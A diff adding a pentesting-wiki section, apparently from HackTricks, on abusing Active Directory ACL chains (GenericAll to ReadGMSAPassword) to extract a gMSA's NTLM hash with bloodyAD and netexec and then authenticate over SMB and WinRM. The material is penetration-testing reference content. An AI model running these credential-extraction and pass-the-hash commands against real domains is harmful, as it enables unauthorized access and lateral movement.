@@ -169,6 +169,47 @@ You can read this password with [**GMSAPasswordReader**](https://github.com/rvaz
 
 Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
 
+### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)
+
+In many environments, low-privileged users can pivot to gMSA secrets without DC compromise by abusing misconfigured object ACLs:
+
+- A group you can control (e.g., via GenericAll/GenericWrite) is granted `ReadGMSAPassword` over a gMSA.
+- By adding yourself to that group, you inherit the right to read the gMSA’s `msDS-ManagedPassword` blob over LDAP and derive usable NTLM credentials.
+
+Typical workflow:
+
+1) Discover the path with BloodHound and mark your foothold principals as Owned. Look for edges like:
+   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA
+
+2) Add yourself to the intermediate group you control (example with bloodyAD):
+
+```bash
+bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
+```
+
+3) Read the gMSA managed password via LDAP and derive the NTLM hash. NetExec automates the extraction of `msDS-ManagedPassword` and conversion to NTLM:
+
+```bash
+# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
+netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
+# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
+```
+
+4) Authenticate as the gMSA using the NTLM hash (no plaintext needed). If the account is in Remote Management Users, WinRM will work directly:
+
+```bash
+# SMB / WinRM as the gMSA using the NT hash
+netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
+netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
+```
+
+Notes:
+- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
+- gMSAs are often granted local rights like WinRM; validate group membership (e.g., Remote Management Users) to plan lateral movement.
+- If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.
+
+
+
 ## LAPS
 
 The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
@@ -268,5 +309,11 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 {{#ref}}
 uac-user-account-control.md
 {{#endref}}
+
+## References
+
+- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
+- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
+- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 {{#include ../../banners/hacktricks-training.md}}
